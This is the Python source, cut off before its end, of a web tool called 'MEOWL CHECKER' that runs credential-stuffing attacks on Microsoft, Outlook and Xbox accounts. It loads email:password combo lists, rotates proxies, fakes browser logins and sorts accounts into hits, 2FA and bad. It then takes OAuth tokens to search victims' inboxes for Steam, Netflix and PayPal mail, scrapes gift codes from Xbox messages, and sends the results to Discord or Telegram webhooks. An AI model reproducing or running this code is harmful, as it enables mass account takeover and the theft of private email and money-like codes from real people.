#!/usr/bin/env python3
"""
MEOWL CHECKER — Web Edition v9
Integrated: Minecraft full-stats capture + Microsoft Balance/Cards + Live Proxy Validator + Checking Logs tab
File: app.py
Run:  python3 app.py
"""

import subprocess, sys, os, json

def _ensure(pkg, module=None):
    module = module or pkg.split('[')[0].split('>')[0].split('<')[0].split('=')[0]
    try:
        __import__(module)
    except ImportError:
        print(f"[*] Installing {pkg}...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "-q"],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            print(f"[!] pip install {pkg} failed: {e}")

for _p, _m in [("flask", "flask"), ("requests", "requests"), ("urllib3", "urllib3"), ("pysocks", "socks")]:
    _ensure(_p, _m)

import re, time, uuid, threading, zipfile, socket
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs
from collections import deque
from io import BytesIO
from typing import Dict, List, Optional, Any, Set
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from flask import Flask, request, jsonify, make_response

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===== Settings =====
SETTINGS_FILE = "meowl_settings.json"
DEFAULT_SETTINGS = {
    "color_primary": "#00b4d8",
    "color_secondary": "#0077b6",
    "discord_webhook": "",
    "tg_token": "",
    "tg_chat_id": "",
    "discord_invite": "https://discord.gg/your-invite",
    "tg_invite": "https://t.me/your-channel"
}
SETTINGS = DEFAULT_SETTINGS.copy()

def load_settings():
    global SETTINGS
    if os.path.exists(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE, 'r') as f:
                SETTINGS.update(json.load(f))
        except Exception:
            pass

def save_settings():
    try:
        with open(SETTINGS_FILE, 'w') as f:
            json.dump(SETTINGS, f, indent=4)
    except Exception:
        pass

load_settings()

# ===== Config =====
REQUEST_TIMEOUT     = 25
THREAD_JOIN_TIMEOUT = 5
HIT_FEED_SIZE       = 500
PORT_DEFAULT        = int(os.environ.get("PORT", 5000))
THREADS_MIN         = 1
THREADS_MAX         = 50
THREADS_DEFAULT     = 30

CODE_FETCH_PATTERN = re.compile(r'[A-Za-z0-9]{5}-[A-Za-z0-9]{5}-[A-Za-z0-9]{5}-[A-Za-z0-9]{5}-[A-Za-z0-9]{5}')
_CODE_MSG_KEYS = {"text", "messageText", "content", "body", "message"}

COUNTRY_MAP = {
    "AF":"Afghanistan","AL":"Albania","DZ":"Algeria","AR":"Argentina","AU":"Australia",
    "AT":"Austria","AZ":"Azerbaijan","BH":"Bahrain","BD":"Bangladesh","BY":"Belarus",
    "BE":"Belgium","BZ":"Belize","BO":"Bolivia","BA":"Bosnia and Herzegovina","BR":"Brazil",
    "BN":"Brunei","BG":"Bulgaria","KH":"Cambodia","CM":"Cameroon","CA":"Canada","CL":"Chile",
    "CN":"China","CO":"Colombia","CR":"Costa Rica","HR":"Croatia","CU":"Cuba","CY":"Cyprus",
    "CZ":"Czech Republic","DK":"Denmark","DO":"Dominican Republic","EC":"Ecuador","EG":"Egypt",
    "SV":"El Salvador","EE":"Estonia","ET":"Ethiopia","FI":"Finland","FR":"France","DE":"Germany",
    "GH":"Ghana","GR":"Greece","GT":"Guatemala","HN":"Honduras","HK":"Hong Kong","HU":"Hungary",
    "IS":"Iceland","IN":"India","ID":"Indonesia","IR":"Iran","IQ":"Iraq","IE":"Ireland",
    "IL":"Israel","IT":"Italy","JM":"Jamaica","JP":"Japan","JO":"Jordan","KZ":"Kazakhstan",
    "KE":"Kenya","KW":"Kuwait","KG":"Kyrgyzstan","LA":"Laos","LV":"Latvia","LB":"Lebanon",
    "LY":"Libya","LT":"Lithuania","LU":"Luxembourg","MO":"Macao","MK":"Macedonia","MY":"Malaysia",
    "MV":"Maldives","MT":"Malta","MX":"Mexico","MD":"Moldova","MN":"Mongolia","ME":"Montenegro",
    "MA":"Morocco","MZ":"Mozambique","MM":"Myanmar","NP":"Nepal","NL":"Netherlands","NZ":"New Zealand",
    "NI":"Nicaragua","NG":"Nigeria","KP":"North Korea","NO":"Norway","OM":"Oman","PK":"Pakistan",
    "PS":"Palestine","PA":"Panama","PY":"Paraguay","PE":"Peru","PH":"Philippines","PL":"Poland",
    "PT":"Portugal","PR":"Puerto Rico","QA":"Qatar","RO":"Romania","RU":"Russia","RW":"Rwanda",
    "SA":"Saudi Arabia","RS":"Serbia","SG":"Singapore","SK":"Slovakia","SI":"Slovenia","SO":"Somalia",
    "ZA":"South Africa","KR":"South Korea","ES":"Spain","LK":"Sri Lanka","SD":"Sudan","SR":"Suriname",
    "SE":"Sweden","CH":"Switzerland","SY":"Syria","TW":"Taiwan","TJ":"Tajikistan","TZ":"Tanzania",
    "TH":"Thailand","TN":"Tunisia","TR":"Turkey","TM":"Turkmenistan","UA":"Ukraine","AE":"UAE",
    "GB":"United Kingdom","US":"United States","UY":"Uruguay","UZ":"Uzbekistan","VE":"Venezuela",
    "VN":"Vietnam","YE":"Yemen","ZM":"Zambia","ZW":"Zimbabwe",
}

def get_flag(cc):
    if not cc or len(cc) != 2: return ""
    cc = cc.upper()
    try:
        return chr(0x1F1E6 + ord(cc[0]) - ord('A')) + chr(0x1F1E6 + ord(cc[1]) - ord('A'))
    except Exception:
        return ""

def translate_country(cc):
    cc = (cc or "").upper().strip()
    name = COUNTRY_MAP.get(cc, cc)
    flag = get_flag(cc)
    return f"{name} {flag}" if flag else name

# ===== Proxy =====
def parse_proxy(line: str) -> Optional[str]:
    line = line.strip()
    if not line: return None
    if '://' in line: return line
    if '@' in line:   return f"http://{line}"
    parts = line.split(':')
    if len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return None

class ProxyPool:
    def __init__(self, proxies=None):
        self.proxies = list(proxies or [])
        self.dead = set()
        self.lock = threading.Lock()
        self.index = 0
        self.proxyless_mode = False

    def get(self):
        with self.lock:
            if self.proxyless_mode or not self.proxies:
                return None
            if len(self.dead) >= len(self.proxies):
                return "ALL_DEAD"
            for _ in range(len(self.proxies)):
                self.index = (self.index + 1) % len(self.proxies)
                p = self.proxies[self.index]
                if p not in self.dead:
                    return p
        return None

    def mark_dead(self, proxy):
        if proxy and proxy != "ALL_DEAD":
            with self.lock:
                self.dead.add(proxy)

    def __len__(self): 
        return max(0, len(self.proxies) - len(self.dead))
    
    def stats(self):
        with self.lock:
            return {
                "total": len(self.proxies),
                "dead": len(self.dead),
                "alive": max(0, len(self.proxies) - len(self.dead))
            }

# ===== Utility =====
def normalize_combo(line: str) -> Optional[str]:
    line = line.strip()
    if not line: return None
    for sep in [':', '|', ';', ',', ' ', '\t']:
        if sep in line:
            parts = line.split(sep, 1)
            email, password = parts[0].strip(), parts[1].strip()
            if email and password and '@' in email:
                return f"{email}:{password}"
    return None

def create_optimized_session(threads=100, timeout=REQUEST_TIMEOUT, proxy=None):
    s = requests.Session()
    pool = threads + 50
    retry = Retry(total=1, backoff_factor=0.3,
                  status_forcelist=[429, 500, 502, 503, 504],
                  allowed_methods=["HEAD", "GET", "POST", "OPTIONS"])
    adapter = HTTPAdapter(max_retries=retry, pool_connections=pool,
                          pool_maxsize=pool, pool_block=False)
    s.mount("https://", adapter)
    s.mount("http://", adapter)
    s.timeout = timeout
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                      'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
    })
    if proxy:
        s.proxies = {'http': proxy, 'https': proxy}
    return s

def format_date(date_str: str) -> str:
    try:
        if not date_str: return "Unknown"
        date_str = date_str.replace('Z', '+00:00')
        return datetime.fromisoformat(date_str).strftime('%d/%m/%Y %H:%M')
    except Exception:
        return "Unknown"

def format_number(num):
    if not isinstance(num, (int, float)):
        try:
            num = float(num)
        except (ValueError, TypeError):
            return '0'
    num = float(num)
    if num < 0: return '0'
    for threshold, suffix, precision in [(1e9,'B',2),(1e6,'M',2),(1e3,'K',1)]:
        if num >= threshold:
            return f'{num / threshold:.{precision}f}{suffix}'
    return str(int(num))

def extract_message_details(msg: dict) -> dict:
    try:
        sender = "Unknown"
        if 'from' in msg and 'emailAddress' in msg['from']:
            sender = msg['from']['emailAddress'].get('address', 'Unknown')
        elif 'sender' in msg and 'emailAddress' in msg['sender']:
            sender = msg['sender']['emailAddress'].get('address', 'Unknown')
        subject = msg.get('subject', 'No Subject')
        date = msg.get('receivedDateTime', '')
        body = ""
        if 'body' in msg and 'content' in msg['body']:
            body = msg['body']['content']
        elif 'bodyPreview' in msg:
            body = msg['bodyPreview']
        if body:
            body = re.sub(r'<[^>]+>', ' ', body)
            body = re.sub(r'&nbsp;', ' ', body)
            body = re.sub(r'&[a-z]+;', ' ', body)
            body = re.sub(r'\s+', ' ', body).strip()
            if len(body) > 200: body = body[:200] + "..."
        return {'sender': sender, 'subject': subject, 'date': date, 'body_preview': body}
    except Exception:
        return {'sender': 'Unknown', 'subject': 'No Subject', 'date': '', 'body_preview': ''}

# ===== Notifications =====
def send_notifications(category, text):
    def _discord():
        url = SETTINGS.get("discord_webhook", "").strip()
        if not url: return
        try:
            requests.post(url, json={"content": f"**[{category}]** `{text}`"}, timeout=5)
        except Exception: pass

    def _telegram():
        token = SETTINGS.get("tg_token", "").strip()
        chat = SETTINGS.get("tg_chat_id", "").strip()
        if not token or not chat: return
        try:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            requests.post(url, json={"chat_id": chat, "text": f"[{category}] {text}", "parse_mode": "Markdown"}, timeout=5)
        except Exception: pass

    threading.Thread(target=_discord, daemon=True).start()
    threading.Thread(target=_telegram, daemon=True).start()

# ===== Code Fetcher =====
def _iter_code_messages(obj):
    if isinstance(obj, dict):
        for k, v in obj.items():
            if k in _CODE_MSG_KEYS and isinstance(v, str):
                yield v
            else:
                yield from _iter_code_messages(v)
    elif isinstance(obj, list):
        for item in obj:
            yield from _iter_code_messages(item)

def _extract_codes_from_text(text) -> List[str]:
    return [m.upper() for m in CODE_FETCH_PATTERN.findall(str(text))]

def _get_ms_tokens(session):
    try:
        res = session.get(
            "https://login.live.com/oauth20_authorize.srf"
            "?client_id=00000000402B5328"
            "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
            "&display=touch&response_type=token&locale=en",
            timeout=15, verify=False
        )
        text = res.text
        ppft_pat  = re.compile(r'name=["\']PPFT["\'][^>]*value=["\']([^"\']+)["\']')
        ppft_pat2 = re.compile(r'value=["\']([^"\']+)["\'][^>]*name=["\']PPFT["\']')
        sft = (re.search(ppft_pat, text) or re.search(ppft_pat2, text)
               or re.search(r'sFTTag[^"]*?value=\\\"([^\\\"]+)\\\"', text)
               or re.search(r'value=\\\"(.+?)\\\"', text))
        post = re.search(r'"urlPost":"(.+?)"', text) or re.search(r"urlPost:'(.+?)'", text)
        if sft and post:
            return post.group(1), sft.group(1)
        return None, None
    except Exception:
        return None, None

def _fetch_codes_for_account(email: str, password: str, proxy: Optional[str] = None,
                              diag: Optional[dict] = None) -> List[str]:
    if diag is None: diag = {}
    session = create_optimized_session(proxy=proxy)
    found_codes: List[str] = []
    try:
        url_post, sft_tag = _get_ms_tokens(session)
        diag['ppft_or_urlpost'] = bool(url_post and sft_tag)
        if not url_post: return found_codes

        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sft_tag}
        res = session.post(url_post, data=data, allow_redirects=True, timeout=15, verify=False)
        diag['login_final_url'] = (res.url or '')[:200]

        ms_token = None
        if '#' in res.url:
            ms_token = parse_qs(urlparse(res.url).fragment).get('access_token', [None])[0]
        elif 'cancel?mkt=' in res.text:
            try:
                ipt   = re.search('(?<="ipt" value=").+?(?=">)', res.text).group()
                pprid = re.search('(?<="pprid" value=").+?(?=">)', res.text).group()
                uaid  = re.search('(?<="uaid" value=").+?(?=">)', res.text).group()
                post_url = re.search('(?<=id="fmHF" action=").+?(?=" )', res.text).group()
                ret = session.post(post_url, data={'ipt': ipt, 'pprid': pprid, 'uaid': uaid},
                                   allow_redirects=True, verify=False)
                final_redirect = re.search('(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text).group()
                fin = session.get(final_redirect, allow_redirects=True, verify=False)
                ms_token = parse_qs(urlparse(fin.url).fragment).get('access_token', [None])[0]
            except Exception:
                pass
        diag['token_found'] = bool(ms_token)
        if not ms_token: return found_codes

        xbl_res = session.post(
            'https://user.auth.xboxlive.com/user/authenticate',
            json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com",
                                 "RpsTicket": ms_token},
                  "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, timeout=15, verify=False)
        if xbl_res.status_code != 200: return found_codes
        xbl_data = xbl_res.json()
        try:
            uhs = xbl_data['DisplayClaims']['xui'][0]['uhs']
            user_token = xbl_data['Token']
        except (KeyError, IndexError):
            return found_codes

        xsts_res = session.post(
            'https://xsts.auth.xboxlive.com/xsts/authorize',
            json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [user_token]},
                  "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}, timeout=15, verify=False)
        if xsts_res.status_code != 200: return found_codes
        try: xsts_token = xsts_res.json()['Token']
        except KeyError: return found_codes

        auth_header = f"XBL3.0 x={uhs};{xsts_token}"
        msg_res = session.get(
            "https://xblmessaging.xboxlive.com/network/xbox/users/me/conversations/users/xuid(0)?maxItems=500",
            headers={"Authorization": auth_header, "x-xbl-contract-version": "1",
                     "Accept": "application/json"}, timeout=15, verify=False)
        if msg_res.status_code != 200: return found_codes
        for m in _iter_code_messages(msg_res.json()):
            found_codes.extend(_extract_codes_from_text(m))
        return found_codes
    except requests.exceptions.ProxyError:
        raise
    except Exception as e:
        diag['exception'] = str(e)[:200]
        return found_codes

# ===== Hotmail/Outlook =====
class MicrosoftInboxChecker:
    def __init__(self, email, password, proxy=None, inbox_keywords=None, threads=100):
        self.email = email
        self.password = password
        self.proxy = proxy
        self.inbox_keywords = inbox_keywords if inbox_keywords else ["Steam", "Netflix", "PayPal"]
        self.session = create_optimized_session(threads, REQUEST_TIMEOUT, proxy=proxy)
        self.access_token = None
        self.cid = None
        self.country = None
        self.name = None
        self.sFTTag_url = ('https://login.live.com/oauth20_authorize.srf'
                           '?client_id=00000000402B5328'
                           '&redirect_uri=https://login.live.com/oauth20_desktop.srf'
                           '&scope=service::user.auth.xboxlive.com::MBI_SSL'
                           '&display=touch&response_type=token&locale=en')
        self._keyword_messages = {}
        self._diag = {}

    def get_urlPost_sFTTag(self):
        maxretries = 3
        attempts = 0
        while attempts < maxretries:
            try:
                headers = {
                    'User-Agent': ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                   "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                text = self.session.get(self.sFTTag_url, headers=headers,
                                        timeout=REQUEST_TIMEOUT, verify=False).text
                self._diag['page_len'] = len(text or '')
                match = (re.search('value=\\\\\\"(.+?)\\\\\\"', text, re.S) or
                         re.search('value="(.+?)"', text, re.S) or
                         re.search("sFTTag:'(.+?)'", text, re.S) or
                         re.search('sFTTag:"(.+?)"', text, re.S) or
                         re.search('name="PPFT".*?value="(.+?)"', text, re.S))
                if match:
                    sFTTag = match.group(1)
                    match = (re.search('"urlPost":"(.+?)"', text, re.S) or
                             re.search("urlPost:'(.+?)'", text, re.S) or
                             re.search('urlPost:"(.+?)"', text, re.S) or
                             re.search('<form.*?action="(.+?)"', text, re.S))
                    if match:
                        urlPost = match.group(1).replace('&amp;', '&')
                        self._diag['ppft_found'] = True
                        self._diag['urlpost_found'] = True
                        return urlPost, sFTTag
                if attempts == 0:
                    self._diag['page_snippet'] = (text or '')[:400]
            except requests.exceptions.ProxyError:
                raise
            except Exception as e:
                self._diag.setdefault('errors', []).append(str(e)[:120])
            attempts += 1
            time.sleep(0.5)
        return None, None

    def get_xbox_rps(self, urlPost, sFTTag):
        maxretries = 3
        tries = 0
        while tries < maxretries:
            try:
                data = {'login': self.email, 'loginfmt': self.email,
                        'passwd': self.password, 'PPFT': sFTTag}
                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                   "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Connection': 'close',
                }
                login_request = self.session.post(urlPost, data=data, headers=headers,
                                                  allow_redirects=True,
                                                  timeout=REQUEST_TIMEOUT, verify=False)
                self._diag['login_final_url'] = (login_request.url or '')[:200]
                self._diag['login_status'] = login_request.status_code

                if '#' in login_request.url and login_request.url != self.sFTTag_url:
                    token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ['None'])[0]
                    if token != 'None':
                        self._diag['token_found'] = True
                        return 'SUCCESS'
                elif 'cancel?mkt=' in login_request.text:
                    try:
                        ipt   = re.search(r'(?<="ipt" value=").+?(?=">)', login_request.text)
                        pprid = re.search(r'(?<="pprid" value=").+?(?=">)', login_request.text)
                        uaid  = re.search(r'(?<="uaid" value=").+?(?=">)', login_request.text)
                        if ipt and pprid and uaid:
                            d2 = {'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()}
                            action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', login_request.text)
                            if action:
                                ret = self.session.post(action.group(), data=d2,
                                                        allow_redirects=True,
                                                        timeout=REQUEST_TIMEOUT, verify=False)
                                return_url = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text)
                                if return_url:
                                    fin = self.session.get(return_url.group(), allow_redirects=True,
                                                           timeout=REQUEST_TIMEOUT, verify=False)
                                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                                    if token != 'None':
                                        self._diag['token_found'] = True
                                        return 'SUCCESS'
                    except Exception:
                        pass
                    self._diag['reason'] = 'recovery_flow'
                    return '2FA'
                elif any(v in login_request.text for v in
                         ['recover?mkt', 'account.live.com/identity/confirm?mkt',
                          'Email/Confirm?mkt', '/Abuse?mkt=']):
                    self._diag['reason'] = 'needs_verification'
                    return '2FA'
                elif any(v in login_request.text.lower() for v in
                         ['password is incorrect', "account doesn't exist",
                          "that microsoft account doesn't exist",
                          "tried to sign in too many times with an incorrect account or password",
                          'help us protect your account']):
                    self._diag['reason'] = 'wrong_password_or_locked'
                    return 'BAD'
                self._diag['reason'] = 'unknown_response'
                self._diag['body_snippet'] = (login_request.text or '')[:400]
            except requests.exceptions.Timeout:
                self._diag['reason'] = 'timeout'
            except requests.exceptions.ProxyError:
                raise
            except Exception as e:
                self._diag['reason'] = str(e)[:120]
            tries += 1
            time.sleep(0.5)
        return 'BAD'

    def login(self):
        urlPost, sFTTag = self.get_urlPost_sFTTag()
        if not urlPost or not sFTTag:
            self._diag.setdefault('reason', 'no_ppft_or_urlpost')
            return 'BAD'
        return self.get_xbox_rps(urlPost, sFTTag)

    def get_graph_token(self):
        try:
            client_id = '0000000048170EF2'
            scope = ('https://graph.microsoft.com/User.Read '
                     'https://graph.microsoft.com/Mail.Read '
                     'https://graph.microsoft.com/Mail.ReadWrite')
            auth_url = (f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}'
                        f'&response_type=token&scope={scope}'
                        '&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none')
            r = self.session.get(auth_url, timeout=REQUEST_TIMEOUT, verify=False)
            token = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
            if not token:
                scope = 'https://graph.microsoft.com/Mail.Read'
                auth_url = (f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}'
                            f'&response_type=token&scope={scope}'
                            '&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none')
                r = self.session.get(auth_url, timeout=REQUEST_TIMEOUT, verify=False)
                token = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
            return token
        except Exception:
            return None

    def get_profile_via_graph(self, token):
        try:
            headers = {'Authorization': f'Bearer {token}',
                       'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            r = self.session.get('https://graph.microsoft.com/v1.0/me', headers=headers,
                                 timeout=REQUEST_TIMEOUT, verify=False)
            if r.status_code == 200:
                data = r.json()
                self.country = data.get('country', data.get('mobilePhone', 'Unknown'))
                self.name = data.get('displayName', 'Unknown')
                if not self.country or self.country == 'Unknown':
                    try:
                        r2 = self.session.get('https://graph.microsoft.com/v1.0/me/mailboxSettings',
                                              headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
                        if r2.status_code == 200:
                            self.country = r2.json().get('timeZone', 'Unknown')
                    except Exception:
                        pass
                return True
            return False
        except Exception:
            return False

    def get_profile_via_substrate(self):
        try:
            self.session.get('https://outlook.live.com/owa/', timeout=REQUEST_TIMEOUT, verify=False)
            scope = 'https://substrate.office.com/User-Internal.ReadWrite'
            client_id = '0000000048170EF2'
            auth_url = (f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}'
                        f'&response_type=token&scope={scope}'
                        '&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none')
            r = self.session.get(auth_url, timeout=REQUEST_TIMEOUT, verify=False)
            token = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
            if not token: return False
            self.cid = self.session.cookies.get('MSPCID', self.email)
            headers = {'Authorization': f'Bearer {token}',
                       'X-AnchorMailbox': f'CID:{self.cid}',
                       'Content-Type': 'application/json',
                       'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json'}
            r = self.session.get('https://substrate.office.com/profileb2/v2.0/me/V1Profile',
                                 headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
            if r.status_code == 200:
                data = r.json()
                self.country = data.get('accounts', [{}])[0].get('location', 'Unknown')
                self.name = data.get('names', [{}])[0].get('displayName', 'Unknown')
                return True
            return False
        except Exception:
            return False

    def check_inbox_via_graph(self):
        token = self.get_graph_token()
        if not token: return 0, []
        found_info = []
        total_found_sum = 0
        headers = {'Authorization': f'Bearer {token}',
                   'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        keyword_messages = {}
        for keyword in self.inbox_keywords:
            try:
                query = (f'https://graph.microsoft.com/v1.0/me/messages?$search="subject:{keyword}"'
                         '&$select=subject,receivedDateTime,body,bodyPreview,sender,from&$top=25')
                r = self.session.get(query, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
                if r.status_code == 200:
                    data = r.json()
                    total = data.get('@odata.count', 0)
                    if total == 0 and 'value' in data:
                        total = len(data['value'])
                    if total > 0:
                        total_found_sum += total
                        found_info.append(f"{keyword}: {total}")
                        messages = []
                        for msg in data.get('value', [])[:3]:
                            details = extract_message_details(msg)
                            if details['body_preview']: messages.append(details)
                        if messages: keyword_messages[keyword] = messages
                        try:
                            query2 = (f'https://graph.microsoft.com/v1.0/me/messages?$search="body:{keyword}"'
                                      '&$select=subject,receivedDateTime,body,bodyPreview,sender,from&$top=25')
                            r2 = self.session.get(query2, headers=headers,
                                                  timeout=REQUEST_TIMEOUT, verify=False)
                            if r2.status_code == 200:
                                data2 = r2.json()
                                total2 = data2.get('@odata.count', len(data2.get('value', [])))
                                if total2 > 0:
                                    total_found_sum += total2
                                    found_info.append(f"{keyword}(body): {total2}")
                                    for msg in data2.get('value', [])[:3]:
                                        details = extract_message_details(msg)
                                        if details['body_preview']:
                                            keyword_messages.setdefault(keyword, [])
                                            if len(keyword_messages[keyword]) < 2:
                                                keyword_messages[keyword].append(details)
                        except Exception:
                            pass
            except Exception:
                pass
        self._keyword_messages = keyword_messages
        return total_found_sum, found_info

    def check_inbox(self):
        total_found, found_info = self.check_inbox_via_graph()
        if total_found > 0:
            return total_found, found_info
        token = self.get_access_token_for_outlook()
        if not token:
            return 0, []
        cid = self.session.cookies.get('MSPCID', self.email)
        headers = {'Authorization': f'Bearer {token}',
                   'X-AnchorMailbox': f'CID:{cid}',
                   'Content-Type': 'application/json',
                   'User-Agent': 'Outlook-Android/2.0',
                   'Accept': 'application/json', 'Host': 'substrate.office.com'}
        found_info = []
        total_found_sum = 0
        url = 'https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124'
        keyword_messages = {}
        for keyword in self.inbox_keywords:
            try:
                payload = {
                    'Cvid': str(uuid.uuid4()),
                    'Scenario': {'Name': 'owa.react'},
                    'TimeZone': 'UTC', 'TextDecorations': 'Off',
                    'EntityRequests': [{
                        'EntityType': 'Conversation', 'ContentSources': ['Exchange'],
                        'Filter': {'Or': [
                            {'Term': {'DistinguishedFolderName': 'msgfolderroot'}},
                            {'Term': {'DistinguishedFolderName': 'DeletedItems'}}]},
                        'From': 0, 'Query': {'QueryString': keyword},
                        'Size': 25, 'EnableTopResults': True, 'TopResultsCount': 3}],
                    'AnswerEntityRequests': [{
                        'Query': {'QueryString': keyword},
                        'EntityTypes': ['Event', 'File'], 'From': 0, 'Size': 10,
                        'EnableAsyncResolution': True}],
                    'QueryAlterationOptions': {'EnableSuggestion': True, 'EnableAlteration': True}
                }
                r = self.session.post(url, json=payload, headers=headers,
                                      timeout=REQUEST_TIMEOUT, verify=False)
                if r.status_code == 200:
                    data = r.json()
                    total = 0
                    if 'EntitySets' in data:
                        for entity_set in data['EntitySets']:
                            if 'ResultSets' in entity_set:
                                for result_set in entity_set['ResultSets']:
                                    if 'Total' in result_set: total = result_set['Total']
                                    elif 'ResultCount' in result_set: total = result_set['ResultCount']
                                    elif 'Results' in result_set: total = len(result_set['Results'])
                    if total > 0:
                        total_found_sum += total
                        found_info.append(f"{keyword}: {total}")
            except Exception:
                pass
        self._keyword_messages = keyword_messages
        return total_found_sum, found_info

    def get_keyword_messages(self):
        return getattr(self, '_keyword_messages', {})

    def get_access_token_for_outlook(self):
        try:
            self.session.get('https://outlook.live.com/owa/', timeout=REQUEST_TIMEOUT, verify=False)
            scope = 'https://substrate.office.com/User-Internal.ReadWrite'
            client_id = '0000000048170EF2'
            auth_url = (f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}'
                        f'&response_type=token&scope={scope}'
                        '&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none')
            r = self.session.get(auth_url, timeout=REQUEST_TIMEOUT, verify=False)
            token = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
            if not token:
                auth_url = (f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}'
                            '&response_type=token&scope=service::outlook.office.com::MBI_SSL'
                            '&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none')
                r = self.session.get(auth_url, timeout=REQUEST_TIMEOUT, verify=False)
                token = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
            return token
        except Exception:
            return None

# ===== Xbox (original) =====
class XboxChecker:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.session.verify = False
        self.session.mount('https://', HTTPAdapter(pool_connections=50, pool_maxsize=50))
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                                     "AppleWebKit/537.36"})
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self._diag = {}

    def get_formatted_games(self, session, uhs, xsts_token):
        formatted_list = ""
        premium_keywords = ["resident evil", "fifa", "modern warfare", "call of duty", "rust", "elden ring"]
        games_list = []
        try:
            me_url = "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag"
            headers = {"Authorization": f"XBL3.0 x={uhs};{xsts_token}",
                       "x-xbl-contract-version": "2", "Accept": "application/json"}
            me_resp = session.get(me_url, headers=headers, timeout=10)
            if me_resp.status_code == 200:
                xuid = me_resp.json()['profileUsers'][0]['id']
                ach_url = f"https://achievements.xboxlive.com/users/xuid({xuid})/history/titles?maxItems=999"
                ach_resp = session.get(ach_url, headers=headers, timeout=10)
                if ach_resp.status_code == 200:
                    for t in ach_resp.json().get('titles', []):
                        game_name = t.get('name', 'Unknown Game')
                        current_score = t.get('currentGamerscore', 0)
                        total_score = t.get('totalGamerscore', current_score)
                        is_premium = any(k.lower() in game_name.lower() for k in premium_keywords)
                        games_list.append({'name': game_name, 'score': current_score,
                                           'total_score': total_score, 'premium': is_premium})
                    games_list.sort(key=lambda x: x['score'], reverse=True)
                    for i, game in enumerate(games_list[:50], 1):
                        premium_tag = " 🔥[PREMIUM]" if game['premium'] else ""
                        formatted_list += f"   {i} - {game['name']} | Score: {game['score']}G{premium_tag}\n"
                    if len(games_list) > 50:
                        formatted_list += f"   ... and {len(games_list) - 50} more games\n"
        except Exception:
            pass
        return formatted_list, games_list

    def check_v2(self, email, password):
        try:
            session = self.session
            sftag_url = ("https://login.live.com/oauth20_authorize.srf"
                         "?client_id=00000000402B5328"
                         "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
                         "&scope=service::user.auth.xboxlive.com::MBI_SSL"
                         "&display=touch&response_type=token&locale=en")
            resp = session.get(sftag_url, timeout=15, verify=False)
            self._diag['page_len'] = len(resp.text or '')

            sftag_match = re.search(r'value=\\\"(.+?)\\\"', resp.text)
            if not sftag_match:
